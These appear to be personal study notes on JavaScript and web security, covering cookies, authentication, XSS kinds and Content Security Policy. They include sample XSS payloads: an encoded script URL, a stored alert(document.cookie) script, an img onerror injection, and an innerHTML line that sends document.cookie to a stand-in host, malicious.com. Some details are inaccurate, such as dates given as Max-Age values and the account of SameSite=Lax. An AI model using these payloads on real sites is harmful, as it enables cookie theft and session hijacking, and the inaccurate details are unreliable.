- web browser security
    - Authentication
    - XSS
    - CSRF
    - Browser protections (CORS, clickjacking)

- Language-related security topics
    - Prototype pollution
    - Malicious regular expressions

- Javascript serverless functions


- Strict mode
    - Enforces better code predictability
    -    ```
        'use strict';

        const x = {};
        Object.defineProperty(x, 'foo', {
            value: 10,
            writable: false
        })

        console.log(x.foo);
        x.foo = 11; // only using strict mode , this errors out, else console logs silently print 10
        console.log(x.foo)
        ```
    - Strict mode can be used locally inside the function
    - ES6 modules all by default are in strict mode, non-changeable

- Variables:
    - This works: (var implicitly defines variables on the top)
        ```
        x = 10;
        console.log(x);
        var x;
        ```;
    - with `let` variables need to be defined before initialization
        ``` // This fails
        x = 10;
        console.log(x);
        let x;
        ```;

- Function:
    - implicitly defined at the top ( similar to var)
    - Ways to define a function:
        (1) By function keyword:
            - function <name>(){ ... }

        (2) By arrow function:
            - const arrowFunc = () => { ... }

        (3) By function constructor:
            !Warning, dangerous! Vulnerable to string injections
            - const newFunc = new Function('a', 'b', 'return a+b')
              console.log(newFunc.toString());
              
- Types:
    - Objects are actually typed in js, even though variables are not typed
    - console.log(typeof {}); // object
    - console.log(typeof 1);  // number
    - console.log(typeof ''); // string
    - console.log(typeof 10); // number
    - console.log(typeof null); // object
    - console.log(typeof undefined);  // undefined

- Web browser:
    - Made up of 2 main engine
        - Engine that renders html page
        - Js Engine (e.g. v8 in chrome)
            - Has bindings ( objects and functions by environment)
        - JS Engine has bindings to objects in the browser
            - E.g. Access to paragraph with getElementById
        - Other apis are available (e.g. to access webcam, gpu, usb ports)
        - Also has api such as push messaging that help send data from the server
        - Two tabs in the web browser are actually isolated
        - Has tools for e.g. memory, cpu profiling
        - If application has a manifest, it can be held as a web application 
            that would be equivalent to a mobile application
        - Has workers that help run task in a different process
        - Extensions
            - Usually written in js and have access to certain authorization


- Nodejs:
    - Built on chrome v8 js engine
    - Gives access to other apis, e.g. the filesystem
    - Bindings can be created from other languages ( e.g. c++ ) to nodejs


Authentication:
    - Act of knowing who the client is
        - Client can be human, device  or web browser

    - Login:
        - Process to identify client based on one or
            multiple secrets and traits
        - Once login happens, a session can be created
            - Login method includes
                - Shared secret (not good)
                - username/password (hashed pwd)
                - OTP (has RFC, third party use recommended)
                - Third party login

            - Session authentication:
                - Happens when client is identified through reusable means
                - Session identifies a client that is already logged in
                  without explicitly asking for credentials
                - Session technologies:
                    - Cookies (HttpOnly, please!, not make available to js code)
                    - JSON web token (or JWT)
                    - Random token (can be signed)
                - Few best practises
                    - Only over https
                    - Expire sessions
                    - Invalidate sessions
                - Logout
                    - Act of closing a session
                    - Everyone forgets about logout
                    - The session must be invalidated
                - Authorization:
                    - Privilege of accessing a resource
                    - Role, privilege etc
                - Content-based access:
                    - In GDPR based world, content of a resource is very sensitive
                    - Ensure PII(personally identifiable information may be permissible to access)

    - Some fundamentals of cryptography
        - Hashing
        - Symmetric cryptography ( AES{by default is a block algorithm, use operation mode to turn to a stream algorithm} )
        - Asymmetric cryptography (private key, public key)

    - Cookies:
        - Authentication
        - Tracking and privacy
        - Expressjs:
            - res.setHeader('Set-Cookie', ['server_name'])
                - set by the server
                - browser stores the cookie set
                - on each consecutive request, sets the cookie in the header
                - Retrieve cookie in the browser using document.cookie
            - Multiple values:
                - res.setHeader('Set-Cookie', ['server_name=server1', 'other=me'])
            - Set expiration:
                - res.setHeader('Set-Cookie', ['server_name=server1', 'other=me; Max-Age=21 October 2021'])
                - res.setHeader('Set-Cookie', ['server_name=server1', 'other=me; Max-Age=2021-05-25'])
                - An expiration duration may also be set instead
            - Location:
                - Available on the exact same domain and on all path
                - Can be decided to set to the whole world, subdomains or
                  the exact same domain
            - Security:
                - E.g. By cross site scripting, someone should not be able to 
                  leak the cookie (e.g. make a request to another site with the cookie in it)
                  To limit this , we can use the HttpOnly primitive
                  - res.setHeader('Set-Cookie', ['http=only; HttpOnly'])
                  - This will not be available from javascript code, so the browser may not access it
                    yet, it will be sent in the header
                  - Secure:
                    - Every cookie must actually be set as secure
                    - res.setHeader('Set-Cookie', ['server_name=server1;Secure; HttpOnly'])
                    - Same site:
                        - res.setHeader('Set-Cookie', ['server_name=server1;Secure; HttpOnly; SameSite=Strict'])
                            - Only for the same domain, must not be shared with someone else
                        - res.setHeader('Set-Cookie', ['server_name=server1;Secure; HttpOnly; SameSite=Lax'])
                            - For the subdomain of the domain but not outside
                        - res.setHeader('Set-Cookie', ['server_name=server1;Secure; HttpOnly; SameSite=None'])
                            - No same site policy at all (dangerous)
        - Update cookie:
            - From browser:
                - append cookie:
                    - document.cookie='a=b'; doesn't overrides, adds to existing cookie values
                - delete a cookie(or render it empty):
                    - document.cookie='a='

        - Zombie cookie:
            - Hack to enable developers to force cookie from FE, which is called a zombie cookie:
                - Set item e.g. periodically from local storage

        - Cookies must adhere to legislation, e.g. GDPR for EU


        Front end practises:
            - E.g. password fields should be detectable by password managers
              - Form should have an action
              - Input fields are typed e.g. <input type="password".../> [pwd managers suggest strong pwds]
              - Credentials such as user token are better to save in a session storage
                instead of local storage
              - Tokens must be saved only in an HTTP only to prevent XSS attacks
              - When logging out, the backend(server) must also be informed to 
                invalidate the token instead of just removing the token from the
                front end only
              - Better to save creds/token in a cookie and use it, as requests are automatically
                added with cookies, but, when using local storage, they have to be manually
                read and added to requests instead
              - For safety of your website, you should use only:
                Domain scoped, same site expiring HTTP only cookies
              - Can cookies be JWT?:
                - JWT are actually for use of the server, not the frontend, 
                  in this case, it should rather be a JSON Web Signature or
                  a JSON Web Signed Payload which will actually contain
                  things that are signed (determining integrity), but these
                  usually don't hold data for authentication
              - For good UX even parts of the website should be authenticated
                e.g. '/admin' page in the FE, may immediately call '/api/admin'
                on the server, if there is no FE authentication, then the 
                server will be spammed with backend requests.
                - Cookies are good for FE authentication


XSS/XSS attacks:
    NOTE: doesn't happen only on FE, XSS also occurs in BE
    - Happens when a malicious attacker messages to run arbitrary
      JS code in given browser through a webpage.
        - When attacker runs code, they can impersonate the user
          on this web application.
        - If someone has XSS attack in your back website, they can
          perform any operation allowed by the website on your behalf
    - Kinds of XSS:
        - Reflected XSS:
            - XSS payload is present in an HTTP request to which a 
              response is issued, containing the exploited webpage
         ***- User is tricked to click on a certain link, will send
              XSS payload to the backend,
              responds with the rendered page
              that will contain the XSS payload on an executable part 
              of the page
            - They are not persistent

            - Some ways in which it's done:
                - 1. E.g. localhost:3000/?name=Johnny
                    - Hacker tries to see http://localhost:3000?name=Johnny can get in sync 
                      with something like this: 
                      http://localhost:3000?name=<b>hello</b>, If this gets through, 
                      it would mean maybe xss could be implemented
                      - Next step would be something like this: 
                        - encodeURIComponent("<script>alert('xss code')</script>") -> %3Cscript%3Ealert('Hello')%3C%2Fscript%3E
                          http://localhost:3000?name=%3Cscript%3Ealert('xss code')%3C%2Fscript%3E
                        - user is provoked to clicking this, some camoflauge may be used
                          E.g. using URL shortner
                        - If the website for e.g. already has a cookie, then being able to run this
                          would mean being able to retrieve sensitive data from the cookie

                - 2. E.g. Vulnerable forms(e.g. without validation) may let to execute xss attacks
                      - Prevent this by:
                        - Escaping html code
                        - Use templating engines, or ssr to escape the values

        - Stored XSS
            - Permanent in nature
         ***- XSS payload is injected into the storage of the webserver
              (e.g.) in a database and sent in the HTTP responses. When
              message is read, the payload is executed.
            - E.g.
                - 1. In a form, where no validation is there, following values are entered
                      name: <script>alert('some name')</script>
                      age: 23
                    - This gets stored in the database, when there is an endpoint which fetches
                      data, and renders the script, the script gets executed
                - 2. name: <script>alert(document.cookie)</script>
                     - This can be used to obtain cookie, as this might be stored in BE
                       and parsed as a script
                - Blind XSS (Special case):
                    - Usually in the above cases, the attacker knows where the payload is rendered
                    and the attack is targeted for that page
                        But, when the attacker doesn't know this, he puts as much as payload
                        everywhere possible, which is called Blind Xss attack
            - Prevention tips:
                - Render using a template engine
                - Use form validation
                - Prevent writing weird user input in database directly

        - DOM-based XSS:
            - NOTE: The browser doesn't execute <script> tags that are added with 
                    inner HTML
            - NOTE: Images have lower browser limitations than scripts
            - NOTE: Server side rendering react is by default vulnerable to XSS
            - NOTE: Vuejs is less explicit
            - Happens when the XSS payload is made executable through a DOM change
            - If REST api returns the XSS payload, it is not directly executable.
              It will need a DOM operation, vulnerability lies in the frontend code
            - These may or maynot be permanent.
            - E.g.
                - 1. function fetchUser() {
                        return Promise.resolve({ firstName: `<img src="aaaa" onerror="alert('hello')"`/> }) 
                     }
            - Prevention tips:
                - Never use exploitable code such as: 'document.innerHTML' in your sourceCode
                - Don't have code that can use arbitrary urls
                - Never put yourself in a situation where the user can render html
                - Don't trust user input or response or local storage or cookie or session storage etc.
                - Check for any framework in use, which parts are defined vulnerable for 
                  xss (For e.g. google 'React xss')

        - Self XSS:
            
            - The victim is tricked into running the XSS payload themselves.
            - Happens through mind-tricks and social engineerings.
              E.g. Someone tells the user to copy/paste code to console to 
                   gain incentives

        - Code execution and other variable sinks:
            - RCI (Remote Code Injection)
                - Able to run arbitrary code where the machine is not yours
            - XSS are subcases (or special hacks) of RCE (Remote Code Execution)
            - Is there are way to turn arbitrary string to executable javascript?
                - Have the browser to not execute it directly as a script
                - Due to use of some code that permit this behaviour:
                    - E.g. 1. eval('arbitrary code string')
                           2. new Function('a', 'b', 'return a+b;')
                           3. const vm = require('vm') // also allows running code
                           4. Dynamic imports
                              E.g. const { f } = await import('./url'); f();
                                   if the url is arbitrary path e.g. from the user 
                                   but is valid, user can run anything by loading
                                   arbitrary js, or it may have compacted code
        
        - Content Security Policy and XSS:
            - One of the most powerful way in js to prevent all kind of unfaithful
              resource loading
            - Protects against XSS attacks
            - Helps protect against packet sniffing
                E.g. By forcing traffic only from https
            - To specify:
                - An additional header can be returned in the server response that is
                  responsible for setting the content security policy
                  E.g. <Server Response Header>
                    Content-Security-Policy: <directive><value>;<directive><value>
                - Specify using HTML5 meta tags:
                    <meta http-equiv="Content-Security-Policy" content="<directive> <value>; <directive> <value>"
                  
            - CSP headers:
                - script-src 'none';
                    - Cannot load js by default
                - Define custom domains allowed:
                    - script-src 'self' http://*.jquery.com
                    - This prevents attacks like: 
                        document.getElementById('any')
                            .innerHTML = `<img src='https://malicious.com?value=document.cookie'/>`
                    - report-uri:
                        - Used to report CSP violations
                    - CSP can help block inline scripts:
                        - E.g. script-src 'strict-dynamic' 'sha256-base64EncodedHash'
                    - CSP can be report only instead of blocking as in above
                      this can be done by using: 'Content-Security-Policy-Report-Only'
                    - Helmet CSP (npm library to build CSP policy in a friendly way)
